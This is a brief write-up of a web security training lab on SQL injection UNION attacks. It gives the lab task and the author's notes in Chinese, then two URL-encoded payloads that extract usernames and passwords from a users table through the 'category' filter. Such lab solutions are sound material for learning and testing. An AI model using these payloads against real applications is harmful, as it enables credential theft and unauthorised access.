# Lab: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## SQL injection
* 注入點在 `category`
* 這一題要我們在同一個 column 中可以拿到兩個 column 的資料啦，不過我偷懶沒有查他給的 cheat sheet，不過要一個一個試畢竟我也不知道他到底用了什麼資料庫
* 分別拿兩次就可以了
```
// 拿 username
payload = %27union%20select%20NULL,username%20from%20users%20--%20-
```
```
// 拿 password
payload = %27union%20select%20NULL,password%20from%20users%20--%20-
```